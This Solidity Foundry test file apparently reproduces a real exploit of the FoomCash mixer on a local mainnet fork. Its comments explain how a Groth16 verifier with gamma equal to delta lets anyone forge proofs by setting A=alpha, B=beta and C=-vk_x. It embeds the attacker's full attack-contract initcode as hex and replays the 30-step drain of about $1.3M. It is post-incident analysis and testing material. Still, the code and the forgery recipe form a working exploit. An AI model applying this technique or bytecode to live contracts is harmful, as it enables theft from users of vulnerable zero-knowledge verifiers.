// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : ~19,695,576,757,802.19 FOOM (~$1.3M)
// Attacker      : 0x46c403e3DcAF219D9D4De167cCc4e0dd8E81Eb72
// Attack Contract: 0x256a5D6852Fa5B3C55D3b132e3669A0bdE42e22c (CREATE, attacker nonce 17, same block)
// Vulnerable    : 0xc043865fb4D542E2bc5ed5Ed9A2F0939965671A6 (Groth16 verifier, gamma == delta)
// FoomCash Mixer: 0x239AF915abcD0a5DCB8566e863088423831951f8 (calls the verifier in collect())
// FOOM token    : 0xd0D56273290D339aaF1417D9bfa1bb8cFe8A0933
// Attack Tx     : https://etherscan.io/tx/0xce20448233f5ea6b6d7209cc40b4dc27b65e07728f2cbbfeb29fc0814e275e48
//
// @Info
// Verifier code : https://etherscan.io/address/0xc043865fb4D542E2bc5ed5Ed9A2F0939965671A6#code
// Mixer code    : https://etherscan.io/address/0x239AF915abcD0a5DCB8566e863088423831951f8#code
//
// @Analysis
// Root cause:
//  The deployed Groth16 verifier's verifying key has gamma == delta (identical G2
//  points). Groth16 soundness requires gamma and delta to be independent; when they
//  are equal the pairing check
//      e(A,B) == e(alpha,beta) * e(vk_x, gamma) * e(C, delta)
//  collapses to
//      e(A,B) == e(alpha,beta) * e(vk_x + C, gamma).
//  An attacker sets A = alpha_g1, B = beta_g2 and C = -vk_x, so vk_x + C == 0 (the
//  point at infinity) and the equation holds for ANY public inputs. Proofs are
//  forgeable offline with no witness — soundness is entirely broken.
// Attack path (single atomic CREATE tx; constructor does everything):
//  For nullifier = 0x174876c0f0 + i (i = 0..29): build public inputs
//  (recipient = attacker, fresh nullifier, root, denomination), compute vk_x from
//  the verifier IC[], set C = -vk_x, and call mixer.collect(proof, ...) which
//  passes verification and transfers FOOM straight to the attacker EOA. 30 loops
//  drain the pool (each collect pays out the halving remainder of the balance).
//
// PoC strategy: replay the historical CREATE initcode (the whole attack tx input,
// constructor args = mixer, FOOM, attacker) from the attacker EOA at block 24539649
// (one before the exploit). Attacker nonce 17 reproduces the real attack address.
// No proof re-forging: the forged proofs are recomputed by the original constructor.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract FoomCash_Groth16_exp is BaseTestWithBalanceLog {
    address constant ATTACKER = 0x46c403e3DcAF219D9D4De167cCc4e0dd8E81Eb72;
    // Historical CREATE address (attacker nonce 17 at fork block).
    address constant ATTACK_CONTRACT = 0x256a5D6852Fa5B3C55D3b132e3669A0bdE42e22c;
    address constant MIXER = 0x239AF915abcD0a5DCB8566e863088423831951f8;
    address constant VERIFIER = 0xc043865fb4D542E2bc5ed5Ed9A2F0939965671A6;
    address constant FOOM = 0xd0D56273290D339aaF1417D9bfa1bb8cFe8A0933;

    uint256 constant ATTACK_BLOCK = 24_539_650;
    uint256 constant FORK_BLOCK = ATTACK_BLOCK - 1;
    // Exact historical drain: sum of the 30 collect() payouts.
    uint256 constant EXPECTED_PROFIT = 19_695_576_757_802_192_910_518_134_117_126;

    // Historical CREATE initcode = the full attack tx input (constructor performs the
    // whole 30x collect() drain). Constructor args appended: (mixer, FOOM, attacker).
    bytes constant CREATE_INITCODE =
        hex"6080604052346103985760606108cb803803809161001c826103ec565b608039"
        hex"126103985761002c61044a565b61003660a0610460565b61004060c061046056"
        hex"5b906100de6100d06001600160a01b0384166100d86100c85f5160206108ab5f"
        hex"395f51905f5261007b5f51602061088b5f395f51905f52610488565b7f1f6506"
        hex"5c751b66705bf4f69395981d5cb7058be6ec368ad4ff3271d7f3548526089273"
        hex"73f55a95d6959d95b3f3f11ddd268ec502dab1ea81116103c9576100c2906104"
        hex"d5565b92610676565b9390926106df565b9390926107b1565b90610820565b60"
        hex"40949091906001600160a01b03165f5b601e81106101ef575b505084516370a0"
        hex"823160e01b81523060048201526001600160a01b039390931693929150602090"
        hex"5081602481865afa9081156101bb575f916101c0575b5080610149575b835160"
        hex"3990816108528239f35b835163a9059cbb60e01b81526001600160a01b039290"
        hex"92166004830152602482015290602090829060449082905f905af180156101bb"
        hex"5761018c575b808061013c565b6101ad9060203d6020116101b4575b6101a581"
        hex"83610417565b81019061065e565b505f610185565b503d61019b565b61064456"
        hex"5b6101e2915060203d6020116101e8575b6101da8183610417565b8101906106"
        hex"4f565b5f610135565b503d6101d0565b6101f88161052f565b63dead00008111"
        hex"61039c5761021f6102176102128361051b565b610748565b908787610820565b"
        hex"61022b8a93929361043a565b7f245229d9b076b3c0e8a4d70bde8c1cccffa08a"
        hex"9fae7557b165b3b0dbd653e2c781527f253ec85988dbb84e46e94b5efa3373b4"
        hex"7a000b4ac6c86b2d4b798d274a182302602082015261027d8b61043a565b9161"
        hex"02878c61043a565b7f07090a82e8fabbd39299be24705b92cf208ee8b3487f6f"
        hex"2b39ff27978a29a1db81527f2424bcc1f60a5472685fd50705b2809626e17012"
        hex"0acaf441e133a2bd5e61d244602082015283526102db8c61043a565b7f0ae113"
        hex"5cffdaf227c5dc266740607aa930bc3bd92ddc2b135086d9da2dfd3e2a81527f"
        hex"2b86859fd3d55c9d150fb3f0aeba798826493dd73d357ab0f9fdaced9fc81829"
        hex"602082015260208401526103328c61043a565b9485526020850152853b156103"
        hex"98576103618a5f948d519687958695631611224f60e01b875260048701610576"
        hex"565b038183875af1908161037e575b50155f036100f8576001016100ef565b80"
        hex"61038c5f61039293610417565b80610545565b5f61036e565b5f80fd5b61021f"
        hex"6102176102126103c46103b185610509565b5f5160206108ab5f395f51905f52"
        hex"900690565b610488565b6103c46103b16100c2926104b3565b634e487b7160e0"
        hex"1b5f52604160045260245ffd5b6080601f91909101601f191681019060016001"
        hex"60401b0382119082101761041257604052565b6103d8565b601f909101601f19"
        hex"168101906001600160401b0382119082101761041257604052565b9061044860"
        hex"40519283610417565b565b608051906001600160a01b03821682036103985756"
        hex"5b51906001600160a01b038216820361039857565b634e487b7160e01b5f5260"
        hex"1160045260245ffd5b5f5160206108ab5f395f51905f5203905f5160206108ab"
        hex"5f395f51905f5282116104ae57565b610474565b7373f55a95d6959d95b3f3f1"
        hex"1ddd268ec502dab1e9198101919082116104ae57565b7373f55a95d6959d95b3"
        hex"f3f11ddd268ec502dab1ea03907373f55a95d6959d95b3f3f11ddd268ec502da"
        hex"b1ea82116104ae57565b63deacffff198101919082116104ae57565b63dead00"
        hex"00039063dead000082116104ae57565b64174876c0f001908164174876c0f011"
        hex"6104ae57565b5f91031261039857565b905f905b600282106105605750505056"
        hex"5b6020806001928551815201930191019091610553565b939195949290956105"
        hex"8c8561020081019861054f565b5f604086015b6002821061060a575050506101"
        hex"e09284926105b56105e09360c05f98019061054f565b5f51602061088b5f395f"
        hex"51905f526101008501526101208401526001600160a01b031661014083015256"
        hex"5b6001600160a01b03831661016082015282610180820152826101a082015260"
        hex"076101c08201520152565b82515f90825b6002831061062e5750505060206040"
        hex"60019201930191019091610592565b6020806001928451815201920192019190"
        hex"610610565b6040513d5f823e3d90fd5b90816020910312610398575190565b90"
        hex"816020910312610398575180151581036103985790565b906040517f2da4c898"
        hex"b778a7d7917a2574dd4ecda9260b5a035bdcf2b6523e8001625fe40881526020"
        hex"8101927f0de6f01f6f29204b225260475d62a45e630e4e2e4afff05971cd3d92"
        hex"085894708452604082015260408160608160075afa156103985751915190565b"
        hex"906040517f296a1c01bc6a06c0541aaa77df5b7b7c9d5bdee121a0a317dd1252"
        hex"0b6331877a815260208101927f14692a5cc46c0377c344b44a985b5010e155f2"
        hex"f0825c50b58996cf0568e026118452604082015260408160608160075afa1561"
        hex"03985751915190565b906040517f0abaa5babcaa6c4dfbf86a30f488f24522e6"
        hex"3bfc51d4a0e29ec6b249bf12a54a815260208101927f1640c6aa1bbb1334ef00"
        hex"f500cb771db03874daf03b61bb2669a02eec9ea20e5184526040820152604081"
        hex"60608160075afa156103985751915190565b9190604051907e92679e5320da25"
        hex"5d62891f8eb8b9f5a817a79e1b3993f8535ac4897faa5e18825260208201937f"
        hex"0226c52f3e495dac9a1485619430ef48383dc7e8894a13c51a66a94a1621307f"
        hex"85526040830152606082015260408160808160065afa15610398575191519056"
        hex"5b91939290936040519283526020830194855260408301526060820152604081"
        hex"60808160065afa15610398575191519056fe5f80fdfea2646970667358221220"
        hex"92962f5078c47ed87dc3da4d23ac06ad650f6737b2a39deca7e84ab473c7ac55"
        hex"64736f6c634300081c00331133f8fc791e2940aa6097725856d044ed272b4bf8"
        hex"61c166a37260c39ae4be6e30644e72e131a029b85045b68181585d2833e84879"
        hex"b9709143e1f593f0000001000000000000000000000000239af915abcd0a5dcb"
        hex"8566e863088423831951f8000000000000000000000000d0d56273290d339aaf"
        hex"1417d9bfa1bb8cfe8a093300000000000000000000000046c403e3dcaf219d9d"
        hex"4de167ccc4e0dd8e81eb72";

    function setUp() public {
        // Online warm uses the mainnet alias; exhaustive_warm rewrites to anvil localhost.
        vm.createSelectFork("http://127.0.0.1:8545", FORK_BLOCK);
        fundingToken = FOOM;
        attacker = ATTACKER;
    }

    function testExploit() public balanceLog {
        uint256 mixerBefore = IERC20(FOOM).balanceOf(MIXER);
        uint256 attackerBefore = IERC20(FOOM).balanceOf(ATTACKER);
        require(attackerBefore == 0, "attacker already funded");
        require(mixerBefore > EXPECTED_PROFIT, "unexpected mixer balance");

        // Replay historical CREATE (attacker nonce 17 -> ATTACK_CONTRACT).
        vm.startPrank(ATTACKER, ATTACKER);
        address deployed;
        bytes memory initcode = CREATE_INITCODE;
        assembly {
            deployed := create(0, add(initcode, 0x20), mload(initcode))
        }
        require(deployed == ATTACK_CONTRACT, "CREATE address mismatch");
        vm.stopPrank();

        uint256 attackerAfter = IERC20(FOOM).balanceOf(ATTACKER);
        uint256 profit = attackerAfter - attackerBefore;

        assertEq(profit, EXPECTED_PROFIT, "attacker FOOM profit mismatch");
        assertGt(profit, 0, "no profit");

        emit log_named_decimal_uint("Attacker FOOM profit", profit, 18);
        emit log_named_decimal_uint("Mixer FOOM before", mixerBefore, 18);
        emit log_named_decimal_uint("Mixer FOOM after", IERC20(FOOM).balanceOf(MIXER), 18);
    }
}
